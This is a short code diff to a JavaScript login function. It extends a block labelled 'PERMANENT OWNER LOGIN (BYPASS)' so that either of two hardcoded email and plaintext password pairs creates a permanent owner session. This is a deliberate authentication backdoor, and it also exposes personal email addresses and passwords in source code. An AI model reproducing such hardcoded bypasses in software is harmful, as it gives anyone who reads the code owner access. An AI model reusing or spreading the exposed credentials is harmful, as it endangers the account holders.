@@ -25,10 +25,10 @@ export async function login(email, password) {
      🔥 PERMANENT OWNER LOGIN (BYPASS)
   ========================================= */
 
-  if (
-    email === "ojask68@gmail.com" &&
-    password === "Ookale@123"
-  ) {
+if (
+  (email === "ojask68@gmail.com" && password === "Ookale@123") ||
+  (email === "jeethaldar76@gmail.com" && password === "jeet@123")
+) {
 
     const ownerSession = {
       uid: "PERMANENT_OWNER",
